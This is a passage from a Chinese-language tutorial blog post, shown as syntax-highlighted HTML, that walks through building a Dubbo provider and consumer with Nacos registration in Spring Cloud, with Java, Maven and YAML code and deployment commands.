<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>fallback<span class="token punctuation">.</span></span><span class="token class-name">UserClientFallbackFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>openfeign<span class="token punctuation">.</span></span><span class="token class-name">FeignClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Feign 客户端接口
 * @description: 用户信息 远程调用接口
 * @date 2019年7月22日
 */</span>

<span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"uaa-provider"</span><span class="token punctuation">,</span>
        configuration <span class="token operator">=</span> <span class="token class-name">FeignConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
<span class="token comment">//        fallback = UserClientFallback.class,</span>
        fallbackFactory <span class="token operator">=</span> <span class="token class-name">UserClientFallbackFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
        path <span class="token operator">=</span> <span class="token string">"/uaa-provider/api/user"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserClient</span>
<span class="token punctuation">{<!-- --></span>
      <span class="token comment">/**
     * 远程调用 RPC 方法：获取用户详细信息
     * @param userId 用户 Id
     * @return 用户详细信息
     */</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/detail/v1"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/hello/v1"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h4><a id="dubboprovider__3562"></a>服务提供者实操：dubbo-provider 服务</h4> 
<h5><a id="pom_3564"></a>pom依赖</h5> 
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- dubbo --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dubbo-registry-nacos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>nacos-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.nacos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- dubbo starter --&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.nacos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>nacos-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${nacos-client-verson}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h5><a id="_3594"></a>服务实现类</h5> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>sevice</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">UserClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DubboService</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@DubboService</span>
<span class="token annotation punctuation">@Component</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserClientDubboService</span> <span class="token keyword">implements</span> <span class="token class-name">UserClient</span> <span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">UserDTO</span> dto<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UserDTO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dto<span class="token punctuation">.</span><span class="token function">setUserId</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dto<span class="token punctuation">.</span><span class="token function">setNickname</span><span class="token punctuation">(</span><span class="token string">" dubbo rpc test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">RestOut</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>dto<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setRespMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"from dubbo provider : 你好，"</span><span class="token operator">+</span>name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="dubboFeign_3626"></a>dubbo和Feign的一个不同</h5> 
<ul><li>dubbo的服务发布和暴露，直接在 service 层加上注解 ，就完成了</li></ul> 
<p>比如：上面的案例中，加上一个类级别的 注解，就可以 暴露这个服务接口 @DubboService</p> 
<ul><li>而 Feign 的服务接口发布，是在 @Controller 层完成的。</li></ul> 
<p>相对来说，比 使用 Dubbo 更为笨重</p> 
<h5><a id="ProviderDubboNacos_3640"></a>Provider的Dubbo+Nacos配置文件</h5> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo<span class="token punctuation">-</span>provider<span class="token punctuation">-</span>demo


<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">28088</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /dubbo<span class="token punctuation">-</span>provider<span class="token punctuation">-</span>demo

<span class="token comment">#### 暴露端点</span>
<span class="token key atrule">management</span><span class="token punctuation">:</span>
  <span class="token key atrule">endpoints</span><span class="token punctuation">:</span>
    <span class="token key atrule">web</span><span class="token punctuation">:</span>
      <span class="token key atrule">base-path</span><span class="token punctuation">:</span> <span class="token string">"/actuator"</span>  <span class="token comment"># 配置 Endpoint 的基础路径</span>
      <span class="token key atrule">exposure</span><span class="token punctuation">:</span>
        <span class="token key atrule">include</span><span class="token punctuation">:</span> <span class="token string">'*'</span>  <span class="token comment">#在yaml 文件属于关键字，所以需要加引号</span>
  <span class="token key atrule">endpoint</span><span class="token punctuation">:</span>
    <span class="token key atrule">logfile</span><span class="token punctuation">:</span>
      <span class="token comment"># spring boot admin  client不配置日志文件路径（同时配置logback-spring.xml对应的日志输出配置，否则无法输出日志），</span>
      <span class="token comment"># 控制台上的Logging模块下的Logfile会报错：Fetching logfile failed.Request failed with status code 404</span>
      <span class="token key atrule">external-file</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>log_dubbo_provider_demo_path_full<span class="token punctuation">:</span>C<span class="token punctuation">:</span>/logs/dubbo<span class="token punctuation">-</span>provider<span class="token punctuation">-</span>demo/logs/output.log<span class="token punctuation">}</span>
      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">health</span><span class="token punctuation">:</span>
      <span class="token key atrule">show-details</span><span class="token punctuation">:</span> always
    <span class="token comment"># 未配置/注释 以下内容</span>
<span class="token comment">#  boot:</span>
<span class="token comment">#    admin:</span>
<span class="token comment">#      context-path: consumer</span>
  <span class="token key atrule">metrics</span><span class="token punctuation">:</span>
    <span class="token key atrule">tags</span><span class="token punctuation">:</span>
      <span class="token key atrule">application</span><span class="token punctuation">:</span>  $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
    <span class="token key atrule">export</span><span class="token punctuation">:</span>
      <span class="token key atrule">prometheus</span><span class="token punctuation">:</span>
        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
        <span class="token key atrule">step</span><span class="token punctuation">:</span> 1m
        <span class="token key atrule">descriptions</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>

<span class="token key atrule">dubbo</span><span class="token punctuation">:</span>
  <span class="token key atrule">scan</span><span class="token punctuation">:</span>
    <span class="token key atrule">base-packages</span><span class="token punctuation">:</span> com.crazymaker.cloud.dubbo
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span>  $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
  <span class="token key atrule">protocol</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">-1</span>
  <span class="token key atrule">registry</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">parameters</span><span class="token punctuation">:</span>
      <span class="token key atrule">namespace</span><span class="token punctuation">:</span> dubbo
      <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">config-center</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">metadata-report</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
</code></pre> 
<h5><a id="_EnableDubbo__3712"></a>启动类 加上@EnableDubbo 注解</h5> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>starter</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">IpUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableDubbo</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>discovery<span class="token punctuation">.</span></span><span class="token class-name">EnableDiscoveryClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableApplicationContext</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>env<span class="token punctuation">.</span></span><span class="token class-name">Environment</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">springfox<span class="token punctuation">.</span>documentation<span class="token punctuation">.</span>swagger2<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">EnableSwagger2</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Inet4Address</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@EnableSwagger2</span>
<span class="token annotation punctuation">@EnableDiscoveryClient</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@EnableDubbo</span>

<span class="token annotation punctuation">@SpringBootApplication</span><span class="token punctuation">(</span>scanBasePackages <span class="token operator">=</span>
        <span class="token punctuation">{<!-- --></span>
                <span class="token string">"com.crazymaker.cloud.dubbo.demo"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">)</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DubboProviderApplication</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">ConfigurableApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">DubboProviderApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">Environment</span> env <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> port <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.application.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">String</span> path <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.servlet.context-path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                path <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Inet4Address</span><span class="token punctuation">&gt;</span></span> ip <span class="token operator">=</span> <span class="token class-name">IpUtil</span><span class="token punctuation">.</span><span class="token function">getLocalIp4Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"\n----------------------------------------------------------\n\t"</span> <span class="token operator">+</span>
                    name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is running! Access URLs:\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"Local: \t\thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"swagger-ui: \thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/swagger-ui.html\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"actuator: \thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/actuator/info\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"服务启动报错"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="Provider_3775"></a>启动、体验Provider</h5> 
<p>打包之后，在 咱们优雅的虚拟机centos8中，优雅的启动一下,</p> 
<p>来一个优雅的启动命令</p> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@centos1 work<span class="token punctuation">]</span><span class="token comment"># cd dubbo-provider-demo-1.0-SNAPSHOT/bin/</span>
<span class="token punctuation">[</span>root@centos1 bin<span class="token punctuation">]</span><span class="token comment"># sh ./deploy.sh start</span>
PORT:28088
JVM:-server -Xms512m -Xmx2048m
<span class="token function">nohup</span> java -server -Xms512m -Xmx2048m -Dserver.port<span class="token operator">=</span><span class="token number">28088</span>   -jar /work/dubbo-provider-demo-1.0-SNAPSHOT/lib/dubbo-provider-demo-1.0-SNAPSHOT.jar com.crazymaker.cloud.dubbo.demo.starter.DubboProviderApplication  <span class="token operator">&amp;</span>
 log <span class="token function">file</span> <span class="token builtin class-name">:</span> /work/logs/dubbo-provider-demo-1.0-SNAPSHOT/output.log
</code></pre> 
<p>太爽… 有个vagrant+Centos 开发环境， 开发Java应用，爽到不要不要的</p> 
<p>关键是： 在这个虚拟机 box 文件中，尼恩给大家预装了K8S 云原生环境，大家一键导入省了N多麻烦。基于这个环境， 下一步咱们就开始 “左手大数据、右手云原生” 的高端实操</p> 
<p>继续看，屏幕的下面，下面还有swagger体验地址</p> 
<p><img src="https://images2.imgbox.com/2a/fb/ohBMHT83_o.png" alt=""></p> 
<p>使用这个地址，可以在浏览器开起Swagger -UI 的界面</p> 
<p>http:///cdh1:28088/dubbo-provider-demo/swagger-ui.html</p> 
<p>开启之后的效果，但是，这个和dubbo没有关系</p> 
<p>因为dubbo的服务并没有在swagger ui 展示</p> 
<p><img src="https://images2.imgbox.com/59/4b/YPMs6tPY_o.png" alt=""></p> 
<h5><a id="NacosDubbo_3816"></a>在Nacos查看Dubbo服务的注册情况</h5> 
<p>通过nacos，可以看到 dubbo的服务啦</p> 
<p><img src="https://images2.imgbox.com/42/40/j7k3gysD_o.png" alt=""></p> 
<p>具体的细节，咱们后面讲dubbo视频的时候，再说</p> 
<p>这里先把性能优化起来</p> 
<h4><a id="dubboconsumer__3828"></a>服务消费者实操：dubbo-consumer 服务</h4> 
<h4><a id="consumer_3830"></a>consumer模块</h4> 
<p><img src="https://images2.imgbox.com/2a/00/yaA2dDWt_o.png" alt=""></p> 
<h5><a id="_3836"></a>消费者实现类</h5> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">UserClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Api</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DubboReference</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
